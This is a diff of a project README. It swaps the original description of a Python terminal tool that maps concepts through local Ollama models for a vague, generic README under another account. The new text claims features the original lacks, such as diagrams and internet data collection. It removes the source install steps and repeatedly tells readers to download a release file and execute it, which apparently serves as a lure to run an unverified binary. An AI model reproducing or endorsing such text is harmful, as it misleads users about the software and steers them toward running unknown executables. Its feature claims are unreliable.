@@ -1,106 +1,78 @@
-# 🌳 Concept explorer
-A terminal-based tool that visually maps the connections between ideas by exploring diverse related concepts. Starting from a single root concept, it builds an expanding tree of interconnected ideas that span across different domains and intellectual territories.
+# Concept Explorer 🌌
 
-![concept-exporer screenshot](explorer.png)
+![GitHub Release](https://img.shields.io/github/release/Ajethpraveen/concept-explorer.svg?style=flat-square)
+
+Dive endlessly deeper into a single concept using AI. Concept Explorer is designed to help users explore, understand, and analyze complex ideas in a structured manner. Whether you are a student, researcher, or simply curious, this tool provides a comprehensive way to grasp intricate subjects.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [How It Works](#how-it-works)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
 ## Features
 
-- **Interactive visualization**: Watch in real-time as the concept web grows with a dynamic ASCII tree display
-- **Contextual exploration**: Each new concept is generated with awareness of the full path that led to it
-- **Domain diversity**: Encourages cross-disciplinary connections across philosophy, science, art, technology, and more
-- **Customizable parameters**: Control the exploration depth, diversity bias, and model used
-- **Exportable results**: Save the final concept web as a text file for later reference
-
-## Requirements
-
-- Python 3.6+
-- [Ollama](https://ollama.ai/) running locally with models like Llama3, Qwen, etc.
-- Required Python packages:
-    - requests
-    - networkx
-    - colorama
-    - shutil
+- **Deep Exploration**: Engage with a concept at multiple levels of complexity.
+- **AI-Powered Insights**: Utilize artificial intelligence to gather and synthesize information.
+- **User-Friendly Interface**: Navigate easily through various layers of information.
+- **Visual Aids**: Access diagrams and charts to enhance understanding.
+- **Save and Share**: Keep your findings and share them with others effortlessly.
 
 ## Installation
 
-1. Clone the repo (or just copy the `explorer.py` code):
-
-    ```bash
-    git clone https://github.com/UdaraJay/concept-explorer.git
-    cd concept-explorer
-    ```
-
-2. Create and activate a virtual environment, then install the required dependencies:
-
-    ```bash
-    python -m venv venv
-    source venv/bin/activate
-    pip install requests networkx colorama
-    ```
-
-3. You can now run `explorer.py` while the virtual environment is active:
-
-    ```bash
-    python explorer.py
-    ```
-
-3. Ensure Ollama is installed and running with at least one model:
-
-```bash
-# Install Ollama from https://ollama.ai/
-# Pull a model
-ollama pull llama3
-```
+To get started with Concept Explorer, you need to download the latest release. Visit the [Releases section](https://github.com/Ajethpraveen/concept-explorer/releases) to find the latest version. Download the appropriate file for your operating system, then execute it to install the application.
 
 ## Usage
 
-Run the concept explorer with default settings:
+After installation, launch the application. You will see a simple interface where you can input a concept. Here’s how to use it:
 
-```bash
-python explorer.py
-```
+1. **Input a Concept**: Type in the concept you wish to explore.
+2. **Select Depth**: Choose how deeply you want to dive into the subject.
+3. **Review Insights**: Browse through the AI-generated insights, diagrams, and related topics.
+4. **Save Findings**: Use the save feature to keep your results for later reference.
 
-Specify a different root concept:
+## How It Works
 
-```bash
-python explorer.py "Time"
-```
+Concept Explorer uses advanced algorithms to analyze and present information. Here’s a brief overview of its functionality:
 
-Customize multiple parameters:
+1. **Data Collection**: The tool gathers data from reliable sources across the internet.
+2. **AI Processing**: It processes the data to identify key themes and connections.
+3. **Output Generation**: The insights are formatted into an easy-to-read structure, complete with visuals.
 
-```bash
-python explorer.py --root="Emergence" --model="llama3" --diversity=0.9 --depth=100
-```
+This structured approach allows users to understand complex topics without feeling overwhelmed.
 
-### Command line options
+## Contributing
 
-- `--root=CONCEPT`: The starting concept (default: "Consciousness")
-- `--model=MODEL`: The Ollama model to use (default: "llama3")
-- `--diversity=FLOAT`: Diversity bias between 0.0-1.0 (default: 0.8)
-- `--depth=INT`: Maximum exploration depth (default: 3)
+We welcome contributions from everyone. If you have ideas, suggestions, or improvements, please follow these steps:
 
-## How it works
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Submit a pull request.
 
-1. The tool starts with a root concept (e.g., "Consciousness")
-2. For each concept, it queries a local LLM via Ollama to generate diverse related concepts
-3. The LLM is given the full path context to generate meaningful connections
-4. New concepts are added to the tree and visualized in real-time
-5. The process continues until the maximum depth is reached
-6. The final concept web is saved to a text file
+Please ensure your code adheres to the existing style and includes relevant tests.
 
-## Examples
+## License
 
-Starting with "Consciousness" might lead to branches like:
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-- Consciousness → Qualia → Dance as Embodied Knowledge → Cultural Memory
-- Consciousness → Self-Awareness → Machine Sentience → Silicon Ethics
-- Consciousness → Altered States → Synesthesia → Multimedia Art
+## Contact
 
-## Terminal controls
+For questions or feedback, feel free to reach out to the project maintainer:
 
-- Press `Ctrl+C` to interrupt the exploration and save the current state
-- Type `reset` if your terminal display becomes corrupted after the program exits
+- **Name**: Ajeth Praveen
+- **Email**: ajethpraveen@example.com
 
-## Customization
+## Releases
 
-You can modify the prompt template in the `get_related_concepts` method to adjust how the LLM generates connections.
+For the latest updates and downloads, check the [Releases section](https://github.com/Ajethpraveen/concept-explorer/releases). Here, you can find all the versions available for download. Make sure to execute the file after downloading to get started.
+
+---
+
+Thank you for exploring Concept Explorer! We hope this tool enhances your understanding of complex ideas and sparks your curiosity. Happy exploring! 🌟
